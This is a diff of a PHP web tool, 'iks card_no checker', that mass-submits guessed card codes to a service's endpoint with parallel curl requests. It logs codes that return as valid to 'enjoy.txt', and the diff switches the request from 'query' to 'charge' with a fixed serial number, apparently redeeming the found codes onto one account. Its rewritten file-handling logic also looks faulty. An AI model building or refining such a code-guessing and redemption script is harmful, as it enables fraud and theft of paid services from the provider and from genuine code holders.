@@ -1,36 +1,36 @@
 <!DOCTYPE html>
 <html>
-     
+
 <head>
     <title>
         iks checker by kalou
     </title>
 </head>
- 
+
 <body style="text-align:center;">
-     
+
     <h1 style="color:green;">
         iks card_no checker
     </h1>
-     
+
     <form method="post">
         <br>
         <div>
-            <label>lenght  : </label>
+            <label>lenght : </label>
             <input type="text" name="repeat">
-            <input type="submit" name="check" value="check"/>
+            <input type="submit" name="check" value="check" />
         </div>
         <br>
         <div>
-            <label>Card_NO  : </label>
+            <label>Card_NO : </label>
             <input type="text" name="card_no" value="">
             <input type="submit" name="query" value="query">
         </div>
         <br>
         <div>
-            <label>lenght  : </label>
+            <label>lenght : </label>
             <input type="number" name="codes_lenght" min="1000" max="25000" value="1000" step="100">
-            <label>package  : </label>
+            <label>package : </label>
             <select name="package">
                 <option value="VIP">VIP</option>
                 <option value="SUP">Super</option>
@@ -39,8 +39,9 @@
         </div>
         <br>
     </form>
-</head>
- 
+    <p id="gen-count"></p>
+</body>
+
 </html>
 
 <?php
@@ -245,11 +246,11 @@ function php_curl_multi_with_timeout($codes, $timeout_interval = 100, $timeout_s
     $response = array();
 
     foreach ($codes as $key => $code) {
+        $post_data['sn'] = '191122021902';
         $post_data['card_no'] = trim($code);
-        $post_data['submit'] = 'query';
+        $post_data['submit'] = 'charge';
         $post_data['action'] = 'yes';
         $post_data['check_valid'] = 'yes';
-
         foreach ($post_data as $key => $value) {
             $post_items[] = $key . '=' . $value;
         }
@@ -308,23 +309,24 @@ function incrementCounter($newCounter)
 
 function execute($number = 0)
 {
-    $file = file('codes.txt');
+    $file = fopen('codes.txt', 'r+');
     $fileCounter = file('counter.txt');
-    if ($number != 0) $setNum = $number;
-    if ($number == 0) $setNum = count($file);
-    $startNum = $fileCounter[0] ?? 0;
+    $setNum = $number != 0 ? $number : count(file('codes.txt'));
+    $startNum = 0;
     $endNum = $startNum + $setNum;
 
-    array_shift($fileCounter);
+    fseek($file, 0); // Move the file pointer to the beginning
 
-    array_unshift($fileCounter, $endNum);
-
-    incrementCounter($fileCounter);
-
-    $checkCodes = array();
-    for ($i = $startNum; $i < $endNum; $i++) {
-        array_push($checkCodes, $file[$i]);
+    $checkCodes = [];
+    for ($i = 0; $i < $setNum; $i++) {
+        $checkCodes[] = fgets($file);
     }
+
+    fseek($file, 0); // Move the file pointer to the beginning
+
+    array_shift($fileCounter);
+    array_unshift($fileCounter, $endNum);
+    incrementCounter($fileCounter);
 
     $multiArrayCode = array_chunk($checkCodes, 100);
     foreach ($multiArrayCode as $keyX => $codes) {
@@ -333,16 +335,13 @@ function execute($number = 0)
             $start = stripos($value, "document.getElementById('prompt').innerHTML");
             $end = stripos($value, "</body>");
             $body = substr($value, $start + 46, $end - $start);
-            removeCodeFromFile($codes[$key]);
+
             if ($body == '') {
-                $myfile = fopen("codes.txt", "a") or die("Unable to open file!");
-                fwrite($myfile, $codes[$key]);
-                fclose($myfile);
+                writeToFile('codes.txt', [$codes[$key]]);
             }
+
             if (!stripos($body, 'Error,Card_NO does not exist') && !stripos($body, 'Error,Invalid Card_NO')) {
-                $myfile = fopen("enjoy.txt", "a") or die("Unable to open file!");
-                fwrite($myfile, $codes[$key] . ':' . $body);
-                fclose($myfile);
+                writeToFile('enjoy.txt', [$codes[$key] . ':' . $body]);
                 print_r(['code' => $codes[$key], 'status' => $body]);
                 echo '<br>';
             }
@@ -353,11 +352,23 @@ function execute($number = 0)
                 ob_end_clean();
             }
 
-            print_r(['code' => $codes[$key], 'status' => $body]);
-            echo '<br>';
+            // Remove code from file after checking
+            $lineToRemove = $startNum + $keyX * 100 + $key + 1;
+            for ($i = 0; $i < $lineToRemove; $i++) {
+                fgets($file); // Read lines until the line to remove
+            }
+            $currentPosition = ftell($file); // Store the current position
+            fgets($file); // Read the line to remove
+            $remainingContent = stream_get_contents($file); // Read the remaining content
+            fseek($file, $currentPosition); // Move the file pointer back to the stored position
+            fwrite($file, $remainingContent); // Overwrite the line to remove
+            ftruncate($file, ftell($file)); // Truncate the file to remove any extra content
         }
     }
+
+    fclose($file);
 }
+
 
 function changeCode($newKey)
 {
@@ -388,20 +399,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     }
 }
 
-
-function removeCodeFromFile($checkedCode)
+function writeToFile($filename, $contentArray)
 {
-    $file = file('codes.txt');
-    $fp = fopen('codes.txt', 'w+');
-
-    foreach ($file as $code) {
-        $trimmedCode = trim($code);
-        if ($trimmedCode !== $checkedCode) {
-            fwrite($fp, $code);
-        }
-    }
-
-    fclose($fp);
+    $content = implode("\n", $contentArray);
+    file_put_contents($filename, $content, FILE_APPEND);
 }
 
 clearstatcache();
